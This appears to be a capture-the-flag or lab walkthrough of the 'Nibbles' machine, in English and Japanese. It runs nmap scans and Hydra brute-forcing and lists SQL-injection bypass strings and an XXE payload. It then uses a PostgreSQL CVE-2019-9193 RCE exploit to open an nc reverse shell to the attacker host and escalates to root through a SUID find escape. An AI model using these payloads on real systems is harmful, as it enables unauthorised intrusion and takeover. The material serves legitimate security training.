# Nibbles

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.98.47  |
| Local IP          | 192.168.49.98   |
| Local listen port | 4444 |

## Nmap

- [x] Full TCP port scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 192.168.98.47 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```bash
$ nmap -p$ports -sV -A 192.168.98.47
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 19:09 JST
Nmap scan report for 192.168.98.47
Host is up (0.25s latency).

PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.94 seconds

```

- [x] Well-known UDP port scan

```bash
$ sudo nmap -Pn -sU --min-rate=10000 192.168.98.47
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 19:03 JST
Nmap scan report for 192.168.98.47
Host is up.
All 1000 scanned ports on 192.168.98.47 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds

```

## TCP
### FTP - 21

- [x] Anonymous login

```bash
$ ftp anonymous@192.168.98.47 21
Connected to 192.168.98.47.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
```

- [ ] Check joe account login
  - [x] wilson


```bash
ftp username@192.168.98.47
```

- [x] Brute-force attack

```bash
$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.98.47 -V -f
<snip>
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-26 20:13:14

```

```bash
$ hydra -l wilson -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://192.168.98.47 -V -f -t 60
<snip>
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-26 20:11:55

```

```bash
$ hydra -l wilson -P /usr/share/john/password.lst ftp://192.168.98.47 -V -f -t 60
<snip>
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-26 20:45:42

```



### SSH - 22

- [x] Brute-force attack

```bash
$ hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.98.47 -V -f -t 60
<snip>
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-26 20:18:10

```

| wordlist path                                      | description                                               | lines       |
| -------------------------------------------------- | --------------------------------------------------------- | ----------- |
| /usr/share/wordlists/metasploit/unix_passwords.txt |                                                           | 1,009       |
| /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
| /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login
  - [x] wilson


```bash
ssh username@192.168.98.47
```

If `no matching host key type found` error occurs with this command, try the following.

```bash
ssh -oHostKeyAlgorithms=+ssh-dss username@192.168.98.47
```

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa username@192.168.98.47
```

### HTTP - 80

- [x] Check software version

| software name | version         | vulnerability                                                |
| ------------- | --------------- | ------------------------------------------------------------ |
| Apache        | 2.4.38 (Debian) | [CVE-2021-42013](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013) |

- [x] Directory buster

```bash
gobuster dir -u http://192.168.98.47:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -u http://192.168.98.47:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s "204,301,302,307,401,403"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |

```bash
$ gobuster dir -u http://192.168.98.47:80/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.98.47:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/26 19:15:44 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 1272]
/server-status        (Status: 403) [Size: 278]

===============================================================
2022/05/26 19:17:45 Finished
===============================================================

```

```bash
$ gobuster dir -u http://192.168.98.47:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.98.47:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/26 19:15:29 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2022/05/26 19:52:53 Finished
===============================================================

```



- [ ] Default credentials
  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password
- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty
- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1
- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- [ ] Check `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

### PostgreSQL - 5437

| service    | version                   | vulnerability                                              |
| ---------- | ------------------------- | ---------------------------------------------------------- |
| postgresql | PostgreSQL DB 11.3 - 11.7 | [CVE-2019-9193](https://www.exploit-db.com/exploits/50847) |

`Postgresql` は初めてなので，[HackTricks - Pentesting Postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) で概要を調べる．

> For most systems, the default Postgres user is `postgres` and a password is not required for authentication.

[Login and Connect as Default User](https://chartio.com/resources/tutorials/how-to-set-the-default-user-password-in-postgresql/#login-and-connect-as-default-user)

デフォルトユーザでログインできるか試してみる．

```bash
$ psql -h 192.168.98.47 -p 5437 -U postgres
ユーザー postgres のパスワード:
psql: エラー: "192.168.98.47"、ポート5437でのサーバーへの接続に失敗しました: fe_sendauth: no password supplied
```

[CVE-2019-9193](https://www.exploit-db.com/exploits/50847) のエクスプロイトコードを読むと，`postgres:postgres` がデフォルトになっているので試してみる．

```bash
$ psql -h 192.168.98.47 -p 5437 -U postgres
ユーザー postgres のパスワード:
psql (14.2 (Debian 14.2-1+b2)、サーバー 11.7 (Debian 11.7-0+deb10u1))
SSL 接続 (プロトコル: TLSv1.3、暗号化方式: TLS_AES_256_GCM_SHA384、ビット長: 256、圧縮: オフ)
"help"でヘルプを表示します。

postgres=# \list
                                         データベース一覧
   名前    |  所有者  | エンコーディング |  照合順序   | Ctype(変換演算子) |     アクセス権限
-----------+----------+------------------+-------------+-------------------+-----------------------
 postgres  | postgres | UTF8             | en_US.UTF-8 | en_US.UTF-8       |
 template0 | postgres | UTF8             | en_US.UTF-8 | en_US.UTF-8       | =c/postgres          +
           |          |                  |             |                   | postgres=CTc/postgres
 template1 | postgres | UTF8             | en_US.UTF-8 | en_US.UTF-8       | =c/postgres          +
           |          |                  |             |                   | postgres=CTc/postgres
(3 行)

postgres=#

```

認証情報が分かったので，RCE のエクスプロイトコードを実行する．

```bash
$ python3 50847.py -i 192.168.98.47 -p 5437 -c id

[+] Connecting to PostgreSQL Database on 192.168.98.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _9ea57ef13f123aedcc64ad2aacf2c1db
[+] Command executed

uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)

[+] Deleting table _9ea57ef13f123aedcc64ad2aacf2c1db

```

`wilson` というユーザがいることがわかる．

```bash
$ python3 50847.py -i 192.168.98.47 -p 5437 -c 'ls /home/wilson'

[+] Connecting to PostgreSQL Database on 192.168.98.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _abbfb6179373dd6b67cbfe9c55151aeb
[+] Command executed

ftp
local.txt

[+] Deleting table _abbfb6179373dd6b67cbfe9c55151aeb

```

`local.txt` を手に入れる．

```bash
$ python3 50847.py -i 192.168.98.47 -p 5437 -c 'cat /home/wilson/local.txt'

[+] Connecting to PostgreSQL Database on 192.168.98.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _bbe6a026c4d00f712c2aa85348fceac2
[+] Command executed

75385eac457c5510fb20f05f9cfe3cec

[+] Deleting table _bbe6a026c4d00f712c2aa85348fceac2

```

`/home/wilson/ftp` というディレクトリは空だったが，`ftp` の権限を持ってそう．

rabbit hole っぽい．`rockyou.txt` でブルートフォースしても当たる気配が無い．

`nc` でリバースシェルを手に入れる．この際 `PostgreSQL` が起動している `5437` ポート以外は制限されているので注意する．

```bash
$ python3 50847.py -i 192.168.98.47 -p 5437 -c 'nc 192.168.49.98 5437 -e /usr/bin/bash'

[+] Connecting to PostgreSQL Database on 192.168.98.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _09fdd6053387fc2619c49e04cf6c7325

```

```bash
$ nc -lnvp 5437
listening on [any] 5437 ...
connect to [192.168.49.98] from (UNKNOWN) [192.168.98.47] 44294
python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@nibbles:/var/lib/postgresql/11/main$ 
```

## Linux Privilege Escalation

- [x] List SUDO binaries

```bash
sudo -l
```

- [x] Find SUID binaries

```bash
postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
<esql/11/main$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

`find` コマンドを使って `root` に権限昇格し，`proof.txt` を取得する．

```bash
postgres@nibbles:/var/lib/postgresql/11/main$ /usr/bin/find . -exec /bin/sh -p \; -quit
</11/main$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt
f1a965c0ac1e3cca36c3b402eafc3820
```

## If you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

